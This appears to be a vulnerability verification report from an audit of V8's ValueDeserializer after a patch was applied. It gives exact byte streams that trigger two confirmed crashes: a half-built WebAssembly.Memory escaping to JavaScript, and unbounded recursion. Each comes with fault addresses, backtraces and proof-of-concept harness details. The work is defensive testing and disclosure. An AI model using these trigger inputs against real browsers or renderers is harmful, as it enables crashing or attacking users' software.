@@ -1,0 +1,110 @@
+====================================================================
+RESULTS — ValueDeserializer kWasmMemoryTransfer verification
+Date: 2026-10-13   Sandbox: /tmp/v8-audit/build/v8 (v8 15.7.63)
+====================================================================
+
+SETUP
+-----
+- Base: v8 @ 1c7163e4 (15.7.63), working tree already carried unrelated local mods.
+- Applied ONLY CL d183128c4965 to src/objects/value-serializer.{cc,h} via
+  `git apply --include='src/objects/value-serializer.cc'
+             --include='src/objects/value-serializer.h' f3v/fix-d183128.patch`
+  Worktree value-serializer.cc matched the CL pre-image (9b1d8d7) exactly ->
+  clean apply, no hand-port needed. This = precise head-main state:
+    * added `if (delegate_ == nullptr) return {};` at top-var of ReadWasmMemory
+      (now sits right after maximum_pages validation, line ~2557)
+    * removed ResetIdMap() call from ReadObjectWrapper v13 retry
+    * removed ResetIdMap() definition (.cc) + declaration (.h)
+- Rebuilt: ninja -C out/d d8  (debug build; is_debug=true, v8_enable_sandbox=true)
+  -> out/d/d8 @ v8 15.7.63.  Only value-serializer.cc/.h were touched for this test.
+
+HARNESS
+-------
+/tmp/v8-audit/poc/harness.cc  (linked against out/d component build via
+compile_harness.sh; v8::ValueDeserializer::Delegate subclass returning empty
+from GetSharedArrayBufferFromId / GetWasmModuleFromId, like a browser transfer
+table miss; full stdio/binary in this dir, binary at out/d/harness)
+Public API only: ValueDeserializer::ReadHeader + multiple ReadValue calls on
+one stream (id_map_ persists across ReadValue calls — same multi-value pattern
+as the CL's own unittest DecodeTypedArrayBrokenDataMultiValue).
+
+====================================================================
+C1 — INCOMPLETE WasmMemoryObject ESCAPES TO JS:  CONFIRMED (crash)
+====================================================================
+Stream (version 16 header), delegate PRESENT:
+  ff 10                      version 16
+  6d 00 00                   kWasmMemoryTransfer, max_pages=0, mem64=0
+  42 00                      inner kArrayBuffer len 0 (NOT shared)  [variant c1]
+   or  75 00                 inner kSharedArrayBuffer clone_id 0, delegate
+                             lookup fails (browser-like)            [c1sab]
+  5e 00                      kObjectReference id 0
+
+Sequence:
+  ReadValue #1 -> ReadWasmMemory allocates WasmMemoryObject with NULL backing
+  store (WasmMemoryObject::New(isolate, {}, nullptr, 0, kI32)), AddObjectWithID
+  (id 0), then inner-buffer read FAILS (not shared / delegate miss) -> {}.
+  ReadValue #1 = EMPTY ("Error: Unable to deserialize cloned data.")
+  ReadValue #2 -> kObjectReference(0) -> GetObjectWithID -> returns the
+  half-built WMO from id_map_ (never cleared; ResetIdMap removed).
+  ReadValue #2 = NON-EMPTY;  from JS:
+    typeof wmo                       -> "object"
+    wmo instanceof WebAssembly.Memory -> true
+
+Crash A (wmo.buffer)  [./harness c1  and  ./harness c1sab]:
+  SIGSEGV, fault address 0x48  (null + 0x48)
+  #0 RefreshBuffer          src/wasm/wasm-objects.cc:1034
+      `const SharedFlag bs_shared = backing_store->is_shared();`
+      faulting insn: movzwl 0x48(%r13),%eax  with r13 = 0
+  #1 GetArrayBuffer         src/wasm/wasm-objects.cc:1211
+  #2 WebAssemblyMemoryGetBufferImpl  src/wasm/wasm-js.cc:2678
+  #3 WebAssemblyMemoryGetBuffer      src/wasm/wasm-js.cc:3003
+  exit code 139
+
+Crash B (wmo.grow(0))  [./harness c1grow]:
+  SIGSEGV, fault address 0x8  (null + 0x8)
+  #0 WebAssemblyMemoryGrowImpl  src/wasm/wasm-js.cc:2645
+      `uint64_t old_pages = backing_store->byte_length(seq_cst) / ...`
+  exit code 139
+
+Controls (SAME bytes, NO delegate -> new early-return at ReadWasmMemory):
+  c1ctrl     : value#2 resurfaced a plain empty ArrayBuffer (NOT the WMO;
+               the '42 00' bytes simply parsed as value#2 since the WMO read
+               failed earlier at the delegate check) -> .buffer OK, no crash.
+  c1ctrlsab  : value#2 EMPTY, graceful, no crash.
+  -> The delegate fix works for the no-delegate path; the delegate-present
+     path is the one still open. d8's own regress-566727937.js passes.
+  exit code 0 both controls.
+
+====================================================================
+C2 — UNBOUNDED RECURSION (no STACK_CHECK in cycle):  CONFIRMED (crash)
+====================================================================
+Stream: ff 10, then N x (6d 00 00), then 42 00 terminator.  3 bytes/level.
+  N= 80,000  (240 KB payload) -> GRACEFUL: ReadValue EMPTY, "Unable to
+            deserialize cloned data.", exit 0
+  N= 90,000                   -> SIGSEGV, exit 139         [46 KB margin]
+  N=100,000..300,000          -> SIGSEGV, exit 139
+Depth @8MB main-thread stack in this debug build ~ 85-90k frames.
+gdb of N=300k: backtrace contains the repeating cycle
+  ReadWasmMemory (value-serializer.cc:2561/2569)
+  <-> ReadObjectInternal                      (>=485 frames in bt dump, truncated)
+bottom rsp = 0x7fffff7fefd0 (main-thread stack base) -> native stack
+exhaustion SEGV, NOT a V8 stack-check RangeError. Crash can dispatch in
+arbitrary mid-frame callees (observed: absl::Mutex::lock inside the cpp-heap
+pointer table during WasmMemoryObject::New).
+Release builds / Blink renderers with smaller stacks will need fewer bytes.
+
+====================================================================
+ARTIFACTS
+====================================================================
+/tmp/v8-audit/poc/harness.cc              full harness source
+/tmp/v8-audit/poc/compile_harness.sh      exact build command (extracts d8 -D set)
+/tmp/v8-audit/poc/fix-d183128.patch       the CL applied (fetched from googlesource)
+/tmp/v8-audit/poc/value-serializer.{cc,h}.prefix   pre-patch backups
+/tmp/v8-audit/poc/build.log               ninja d8 rebuild log
+/tmp/v8-audit/poc/run_c1.log  run_c1sab.log  run_c1grow.log      (RC 139 each)
+/tmp/v8-audit/poc/run_c1ctrl.log  run_c1ctrlsab.log              (RC 0)
+/tmp/v8-audit/poc/run_c2_300k.log (RC 139)   run_c2_80k.log (RC 0)
+/tmp/v8-audit/poc/c1_gdb.txt  c1sab_gdb.txt  c1grow_gdb.txt  c2_gdb.txt
+/tmp/v8-audit/poc/fault_addresses.txt       (0x48, 0x48, 0x8)
+/tmp/v8-audit/build/v8/out/d/harness      built PoC binary
+====================================================================
